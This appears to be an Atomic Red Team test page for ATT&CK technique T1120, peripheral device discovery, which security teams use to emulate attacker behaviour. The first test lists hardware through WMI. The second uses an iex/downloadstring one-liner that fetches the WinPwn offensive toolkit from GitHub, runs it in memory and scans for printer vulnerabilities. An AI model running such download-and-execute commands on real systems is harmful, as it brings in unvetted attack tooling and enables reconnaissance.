---
tags: [T1120, atomic_test]
filename: "[[T1120 - Peripheral Device Discovery]]"
---
# T1120 - Peripheral Device Discovery

## Atomic Test #1 - Win32_PnPEntity Hardware Inventory
Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity

**Supported Platforms:** Windows


**auto_generated_guid:** 2cb4dbf2-2dca-4597-8678-4d39d207a3a5






#### Attack Commands: Run with `powershell`! 


```powershell
Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content $env:TEMP\T1120_collection.txt
```

#### Cleanup Commands:
```powershell
Remove-Item $env:TEMP\T1120_collection.txt -ErrorAction Ignore
```





<br/>
<br/>

## Atomic Test #2 - WinPwn - printercheck
Search for printers / potential vulns using printercheck function of WinPwn

**Supported Platforms:** Windows


**auto_generated_guid:** cb6e76ca-861e-4a7f-be08-564caa3e6f75






#### Attack Commands: Run with `powershell`! 


```powershell
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
printercheck -noninteractive -consoleoutput
```






<br/>
